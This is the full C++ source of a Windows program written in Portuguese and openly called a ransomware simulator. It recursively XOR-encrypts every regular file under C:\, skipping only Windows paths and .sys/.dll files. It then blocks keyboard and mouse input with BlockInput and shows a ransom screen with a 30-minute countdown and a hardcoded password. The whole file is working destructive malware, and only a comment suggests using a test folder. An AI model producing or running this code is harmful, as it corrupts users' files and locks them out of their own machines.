#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <chrono>
#include <thread>
#include <atomic>
#include <windows.h> 

namespace fs = std::filesystem;

// --- MÓDULO 1: ESTADOS DO SISTEMA ---
enum class AppState {
    WAITING_FOR_PASSWORD,
    DECRYPTING,
    LOCKED_PERMANENTLY,
    SUCCESS
};

// --- MÓDULO 2: MOTOR DE CRIPTOGRAFIA ---
class CryptoEngine {
private:
    char key; 

public:
    CryptoEngine(std::string password) {
        key = password.empty() ? 'a' : password[0];
    }

    void processFile(const fs::path& filePath, bool encrypt) {
        try {
            std::ifstream inFile(filePath, std::ios::binary);
            if (!inFile) return;

            std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
            inFile.close();

            if (buffer.empty()) return;

            for (size_t i = 0; i < buffer.size(); i++) {
                buffer[i] ^= key; 
            }

            std::ofstream outFile(filePath, std::ios::binary);
            if (!outFile) return;
            outFile.write(buffer.data(), buffer.size());
            outFile.close();
        } catch (...) { }
    }
};

// --- MÓDULO 3: SCANNER DE ARQUIVOS (ROBUSTO) ---
class FileScanner {
private:
    CryptoEngine& engine;

public:
    FileScanner(CryptoEngine& ce) : engine(ce) {}

    void scanAndProcess(const std::string& targetDir, bool encrypt) {
        if (!fs::exists(targetDir)) return;

        for (auto it = fs::recursive_directory_iterator(targetDir, fs::directory_options::skip_permission_denied);
             it != fs::end(it); it++) {
            try {
                if (it->is_regular_file()) {
                    std::string pathStr = it->path().string();

                    if (pathStr.find("Windows") != std::string::npos || 
                        pathStr.find("simulador.exe") != std::string::npos) continue;

                    if (pathStr.find(".sys") != std::string::npos || 
                        pathStr.find(".dll") != std::string::npos) continue;

                    engine.processFile(it->path(), encrypt);
                }
            } catch (...) { continue; }
        }
    }
};

// --- MÓDULO 4: CORE (TIMER E CONTROLE) ---
class RansomwareCore {
private:
    std::atomic<int> timeLeft; 
    std::atomic<AppState> currentState;
    const int INITIAL_TIME = 30 * 60; 

public:
    RansomwareCore() : timeLeft(INITIAL_TIME), currentState(AppState::WAITING_FOR_PASSWORD) {}

    void startTimer() {
        while (timeLeft > 0 && currentState == AppState::WAITING_FOR_PASSWORD) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            timeLeft--;
            if (timeLeft <= 0) currentState = AppState::LOCKED_PERMANENTLY;
        }
    }

    void checkPassword(std::string input) {
        if (currentState == AppState::LOCKED_PERMANENTLY) return;
        if (input == "batata") currentState = AppState::DECRYPTING;
        else std::cout << "\n[!] SENHA INCORRETA!\n";
    }

    AppState getState() const { return currentState.load(); }
    int getTime() const { return timeLeft.load(); }
};

// --- MÓDULO 5: INTERFACE (CORES E ARTE ASCII) ---
class Renderer {
private:
    void setTextColor(int color) {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
    }

public:
    void renderUI(const RansomwareCore& core) {
        system("cls"); // Limpa a tela para o efeito de interface

        // 1. Desenha a Arte ASCII em Vermelho Brilhante
        setTextColor(12); // Vermelho Brilhante
        std::cout << "\n\n";
        std::cout << " //                                               \n";
        std::cout << " //     _____ _____ _____ _____ _____ ____        \n";
        std::cout << " //    |  |  |  _  |     |  |  |   __|    \\       \n";
        std::cout << " //    |     |     |   --|    -|   __|  |  |      \n";
        std::cout << " //    |__|__|__|__|_____|__|__|_____|____/       \n";
        std::cout << " //                                               \n";
        std::cout << " //                                               \n";
        std::cout << " //     _____ __ __                               \n";
        std::cout << " //    | __  |  |  |                              \n";
        std::cout << " //    | __ -|_   _|                              \n";
        std::cout << " //    |_____| |_|                                \n";
        std::cout << " //                                               \n";
        std::cout << " //                                               \n";
        std::cout << " //     _____ _____ _____ _____ ____  _____ __ __ \n";
        std::cout << " //    |__   |   __| __  |     |    \\|  _  |  |  | \n";
        std::cout << " //    |   __|   __|    -|  |  |  |  |     |_   _| \n";
        std::cout << " //    |_____|_____|__|__|_____|____/|__|__| |_|  \n";
        std::cout << " //                                               \n";

        std::cout << "\n====================================================\n";
        std::cout << "        [SISTEMA TOTALMENTE BLOQUEADO]              \n";
        std::cout << "====================================================\n";
        
        // 2. Mensagem de Alerta
        setTextColor(12); // Vermelho
        std::cout << "\n    [AVISO: VOCE FOI HACKEADO POR Z3R0DAY]\n";
        
        setTextColor(7); // Branco
        std::cout << "----------------------------------------------------\n";
        std::cout << "  TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS.       \n";
        std::cout << "  O TEMPO ESTA CORRENDO. NAO TENTE FECHAR O SISTEMA. \n";
        std::cout << "----------------------------------------------------\n";

        if (core.getState() == AppState::LOCKED_PERMANENTLY) {
            setTextColor(4); // Vermelho Escuro
            std::cout << "\n    [!!!] TEMPO ESGOTADO! ACESSO PERMANENTE NEGADO [!!!]\n";
        } else {
            int mins = core.getTime() / 60;
            int secs = core.getTime() % 60;
            std::cout << "\n    Tempo restante: " << mins << ":" << (secs < 10 ? "0" : "") << "\n";
            std::cout << "    Digite a senha para descriptografar: ";
        }
        
        setTextColor(7); 
    }
};

// --- MÓDULO 6: MAIN (O ORQUESTRADOR FINAL) ---
int main() {
    // CONFIGURAÇÃO DO ALVO
    std::string pastaAlvo = "C:\\"; // Mude para sua pasta de teste primeiro!
    std::string senhaCorreta = "batata";
    
    // Prioridade máxima para o processo
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

    RansomwareCore core;
    CryptoEngine engine(senhaCorreta);
    FileScanner scanner(engine);
    Renderer renderer;

    std::cout << "--- INICIALIZANDO SISTEMA DE TESTE ---\n";
    std::cout << "Alvo: " << pastaAlvo << "\n";
    std::cout << "Aguarde a preparacao...\n";

    // 1. Inicia a Criptografia
    scanner.scanAndProcess(pastaAlvo, true); 
    std::cout << "[!] Criptografia concluida.\n";

    // 2. Bloqueio de Hardware (Mouse e Teclado)
    // IMPORTANTE: Rodar como Administrador para o BlockInput funcionar
    BlockInput(TRUE); 

    // 3. Inicia o Timer em background
    std::thread timerThread(&RansomwareCore::startTimer, &core);

    // 4. Loop de Interface
    while (core.getState() != AppState::SUCCESS && core.getState() != AppState::LOCKED_PERMANENTLY) {
        renderer.renderUI(core);

        std::string input;
        std::cin >> input;

        if (core.getState() == AppState::WAITING_FOR_PASSWORD) {
            core.checkPassword(input);
            
            if (core.getState() == AppState::DECRYPTING) {
                std::cout << "\n[!] Senha aceita. Iniciando DESCRIPTOGRAFIA...\n";
                scanner.scanAndProcess(pastaAlvo, false); 
                std::cout << "[!] SUCESSO! Arquivos recuperados.\n";
                break; 
            }
        }

        if (core.getTime() < 1) break; 
    }

    // 5. Liberação do Hardware
    BlockInput(FALSE); 

    if (core.getState() == AppState::LOCKED_PERMANENTLY) {
        std::cout << "\n[!] SISTEMA TRAVADO. O TEMPO ACABOU.\n";
    }

    timerThread.join();
    return 0;
}
